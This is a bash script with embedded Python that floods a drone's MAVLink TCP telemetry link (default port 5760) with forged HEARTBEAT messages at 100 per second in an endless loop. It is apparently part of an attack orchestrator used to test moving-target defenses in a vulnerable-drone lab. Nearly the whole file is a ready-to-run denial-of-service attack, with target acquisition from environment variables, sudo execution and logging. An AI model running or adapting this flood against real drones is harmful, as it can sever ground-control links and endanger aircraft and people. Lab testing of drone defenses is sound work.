#!/usr/bin/env bash
set -euo pipefail

# Attack: Communication Link Flooding (MAVLink TCP Flood, MTD-aware)
# Target Service: DRONE_MAVLINK_TCP (Default Port 5760)

# --- MTD_INTERFACE_START (Mandatory dynamic target acquisition) ---
# Orchestrator가 TARGET_IP, TARGET_PORT, TARGET_SERVICE를 주입해야 합니다.
if [[ -z "${TARGET_IP:-}" || -z "${TARGET_PORT:-}" ]]; then
    echo "ERROR: TARGET_IP and TARGET_PORT environment variables are not set." >&2
    echo "Attack aborted. Must be run via attack_orchestrator.py with MTD state resolution." >&2
    exit 1
fi

# 서비스 타입별 기본 포트 설정 (MAVLink TCP 플러딩을 기본으로 가정)
case "${TARGET_SERVICE:-DRONE_MAVLINK_TCP}" in
    DRONE_MAVLINK_TCP)
        TARGET_PORT="${TARGET_PORT:-5760}"
        ;;
    DRONE_MAVLINK)
        TARGET_PORT="${TARGET_PORT:-14550}"
        ;;
    *)
        # Orchestrator가 포트 값을 넣어준다고 가정
        :
        ;;
esac

echo "[INFO] Target acquired: ${TARGET_IP}:${TARGET_PORT} (service=${TARGET_SERVICE:-UNKNOWN})"
# --- MTD_INTERFACE_END ---

# --- Common Log/BASE Setup ---
export BASE="${BASE:-$PWD}"
if [[ -f "$BASE/00_env.sh" ]]; then
    . "$BASE/00_env.sh"
else
    DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"
    mkdir -p "$(dirname "$DVD_LOG")"
    log(){ echo "[$(date +%F_%T)] $*"; }
    export -f log
fi

log "[ATTACK] id=communication-link-flooding src=Communication-Link-Flooding.md"
log "[BLOCK 1] type=python (MAVLink Heartbeat Flood)"

# python3 스크립트를 인라인으로 실행하며 TARGET_IP:TARGET_PORT 인수를 전달합니다.
# '-u' 옵션을 사용하여 버퍼링 없이 실시간 출력을 보장합니다.
sudo python3 -u - "${TARGET_IP}:${TARGET_PORT}" <<'PY'
import os
import sys
import time
from pymavlink import mavutil

# 인수 없으면 환경변수 TARGET_IP:TARGET_PORT 사용 (Fallback/Debug)
if len(sys.argv) <= 1:
    target_ip = os.environ.get('TARGET_IP', '127.0.0.1')
    target_port = os.environ.get('TARGET_PORT', '5760')
    sys.argv = [sys.argv[0], f"{target_ip}:{target_port}"]

target_ip, target_port_str = sys.argv[1].split(':', 1)
try:
    target_port = int(target_port_str)
except ValueError:
    print(f"[ERROR] Invalid port: {target_port_str}")
    sys.exit(1)

def flood_mavlink(target_ip, target_port, rate_hz=100.0):
    # TCP를 사용하여 MAVLink 연결
    sock = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
    sock.wait_heartbeat()
    
    print(f"[INFO] Connected. Starting MAVLink heartbeat flood to {target_ip}:{target_port} at {rate_hz} messages/sec...")

    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1
    
    interval = 1.0 / rate_hz
    
    # 플러딩용 HEARTBEAT 메시지 생성
    msg = mav.heartbeat_encode(
        type=mavutil.mavlink.MAV_TYPE_GENERIC,
        autopilot=mavutil.mavlink.MAV_AUTOPILOT_INVALID,
        base_mode=0,
        custom_mode=0,
        system_status=mavutil.mavlink.MAV_STATE_ACTIVE
    )
    
    # 플러딩 루프
    while True:
        try:
            sock.mav.send(msg)
            time.sleep(interval)
        except Exception as e:
            # 연결이 끊어졌을 경우 종료 (MTD 이동으로 인한 연결 끊김 등)
            print(f"[ERROR] Disconnected or sending failed: {e}")
            break

if __name__ == "__main__":
    # 인수가 <ip:port>만 있도록 수정되었으므로, rate_hz는 내부에서 기본값 사용
    flood_mavlink(target_ip, target_port)
    
PY

log "[BLOCK 2] type=control (In-Foreground Execution)"
# 공격은 Python 인라인 블록에서 포그라운드로 실행됩니다.
# attack_orchestrator.py는 SIGTERM 또는 timeout을 통해 이 프로세스를 종료해야 합니다.